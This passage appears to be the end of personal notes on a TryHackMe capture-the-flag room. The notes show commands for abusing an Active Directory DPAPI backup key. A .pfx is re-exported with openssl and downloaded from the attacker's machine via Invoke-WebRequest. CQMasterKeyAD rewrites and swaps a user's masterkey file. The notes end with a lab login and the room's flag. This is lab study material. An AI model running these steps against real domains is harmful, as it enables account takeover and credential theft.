Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Fax Recipient.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\SendTo\Mail Recipient.MAPIMail
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\OneDrive.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\Magnify.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\Narrator.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessibility\On-Screen Keyboard.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessories\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Accessories\Internet Explorer.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Administrative Tools\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Maintenance\Desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Startup\desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Administrative Tools.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Command Prompt.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\computer.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Control Panel.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Desktop.ini
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\File Explorer.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\System Tools\Run.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell (x86).lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Start Menu\Programs\Windows PowerShell\Windows PowerShell.lnk
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Themes\TranscodedWallpaper
Scanning c:\users\chajoh\appdata\roaming\Microsoft\Windows\Themes\CachedFiles\CachedImage_2830_2064_POS4.jpg

description:          Private Key
 mkguid:               a773eede-71b6-4d66-b4b8-437e01749caa

┌──(kali㉿kali)-[~/ra]
└─$ cp ntds_capi_0_07ea03b4-3b28-4270-8862-0bc66dacef1a.pfx DMK.pfx       
                                                                                                                                          
┌──(kali㉿kali)-[~/ra]
└─$ openssl pkcs12 -in DMK.pfx -out temp.pem -nodes
Enter Import Password: mimikatz.exe

┌──(kali㉿kali)-[~/ra]
└─$ openssl pkcs12 -export -out DMK2.pfx -in temp.pem
Enter Export Password:
Verifying - Enter Export Password: cqure


PS C:\Temp> Invoke-WebRequest http://10.10.103.96:1234/DMK2.pfx -o DMK2.pfx
PS C:\Temp> ls
ls


    Directory: C:\Temp


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
d-----         9/16/2020  11:55 AM                OpenVPN                                                              
-a----          1/6/2023   8:09 AM         219648 CQDPAPIBlobSearcher.exe                                              
-a----          1/6/2023   8:09 AM          62464 CQMasterKeyAD.exe                                                    
-a----          1/6/2023   8:07 AM           2554 DMK.pfx                                                              
-a----          1/6/2023   8:24 AM           2499 DMK2.pfx                                                             
-a----          1/6/2023   7:05 AM           6656 ivpn.exe                                                             
-a----          1/6/2023   7:11 AM        1291016 mimikatz.exe                                                         
-a----          1/6/2023   8:10 AM            801 resultsfile_20230106_081040.txt  

./CQMasterKeyAD.exe /file "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" /pfx DMK2.pfx /newhash 4c05b64dec614df2b522c401bb8d8994

d5a1ee32-7b1b-446f-be7f-ae0c5302be9c

./CQMasterKeyAD.exe /file "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\d5a1ee32-7b1b-446f-be7f-ae0c5302be9c" /pfx DMK2.pfx /newhash 4c05b64dec614df2b522c401bb8d8994

PS C:\Temp> ./CQMasterKeyAD.exe /file "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" /pfx DMK2.pfx /newhash 4c05b64dec614df2b522c401bb8d8994
./CQMasterKeyAD.exe /file "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" /pfx DMK2.pfx /newhash 4c05b64dec614df2b522c401bb8d8994
New masterkey file successfully written to: c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified
Now swap the old masterkey file with the new one and set the system and hidden attributes, see example:
attrib "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H

Now we need to rename the existing MasterKey file `a773eede-71b6-4d66-b4b8-437e01749caa` in `C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\` to something else and rename our newly created MasterKey `a773eede-71b6-4d66-b4b8-437e01749caa.admodified` to `a773eede-71b6-4d66-b4b8-437e01749caa`

Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa.another"

PS C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125> Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa.another"


PS C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125> dir -for
dir -for


    Directory: C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          1/7/2023   6:01 AM            740 a773eede-71b6-4d66-b4b8-437e01749caa.admodified                      
-a-hs-         9/12/2020   4:13 AM            740 a773eede-71b6-4d66-b4b8-437e01749caa.another                         
-a-hs-         9/11/2020  11:42 AM            908 BK-WINDCORP                                                          
-a-hs-         9/11/2020  11:42 AM             24 Preferred                                                            


Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa"


PS C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125> Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa"
Rename-Item -Path "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa.admodified" -NewName "a773eede-71b6-4d66-b4b8-437e01749caa"
PS C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125> dir -for
dir -for


    Directory: C:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          1/7/2023   6:01 AM            740 a773eede-71b6-4d66-b4b8-437e01749caa                                 
-a-hs-         9/12/2020   4:13 AM            740 a773eede-71b6-4d66-b4b8-437e01749caa.another                         
-a-hs-         9/11/2020  11:42 AM            908 BK-WINDCORP                                                          
-a-hs-         9/11/2020  11:42 AM             24 Preferred  


Lastly, we need to run this command to make sure the new MasterKey is set with the correct attributes:


attrib "c:\users\chajoh\appdata\roaming\microsoft\protect\S-1-5-21-555431066-3599073733-176599750-1125\a773eede-71b6-4d66-b4b8-437e01749caa" +S +H


Thanks Mr.Tom and (use Rdesktop in windows) to login

computer: machine.ip
Username: windcorp\chajoh
Password: hackP@ssw0rd

then login (need to download ovpn from tryhackme and connect it :) )

THM{a77538464954d29a64c607f2318d930ccf4da5cccb308c7334c43fef9c94984448cf732f6de227cbfae9172ee2654e56704568ada698fb241c52148d338a3245}

Was really fun!!

:)

```

![[Pasted image 20230103230422.png]]

![[Pasted image 20230103235641.png]]

![[Pasted image 20230106225619.png]]

![[Pasted image 20230107091114.png]]


[[Set]]